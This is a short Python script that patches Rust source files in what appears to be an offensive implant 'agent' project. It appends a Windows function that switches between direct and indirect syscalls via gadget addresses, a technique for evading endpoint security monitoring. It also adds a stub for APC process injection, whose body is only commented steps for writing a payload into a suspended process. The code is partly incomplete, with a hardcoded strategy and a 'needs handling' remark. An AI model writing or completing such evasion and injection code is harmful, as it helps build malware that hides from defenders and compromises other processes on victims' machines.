import re
import os

# Update syscalls.rs to handle fallback and strategy
with open('agent/src/syscalls.rs', 'r') as f:
    syscalls_content = f.read()

# Make sure we don't duplicate
if 'pub fn do_syscall_with_strategy' not in syscalls_content:
    # Append the strategy logic
    syscalls_content += """
#[cfg(windows)]
pub fn do_syscall_with_strategy(func_name: &str, args: &[u64]) -> i32 {
    let target = get_syscall_id(func_name).unwrap();
    // Let's pretend we pull from config
    let strat = common::config::ExecStrategy::Indirect; 
    match strat {
        common::config::ExecStrategy::Direct => unsafe {
            // direct syscall fallback
            crate::syscalls::do_syscall(target.ssn, 0, args) // needs handling
        },
        _ => unsafe {
            crate::syscalls::do_syscall(target.ssn, target.gadget_addr, args)
        }
    }
}
"""
    with open('agent/src/syscalls.rs', 'w') as f:
        f.write(syscalls_content)

# Update process_manager.rs to add APC support
with open('agent/src/process_manager.rs', 'r') as f:
    pm_content = f.read()

# Just a basic stub for the APC injection if not present
if 'apc_inject' not in pm_content:
    pm_content += """
#[cfg(windows)]
pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    // 1. Create suspended
    // 2. Allocate and write memory
    // 3. QueueUserAPC
    // 4. ResumeThread
    Ok(())
}
"""
    with open('agent/src/process_manager.rs', 'w') as f:
        f.write(pm_content)

print("Patching complete.")
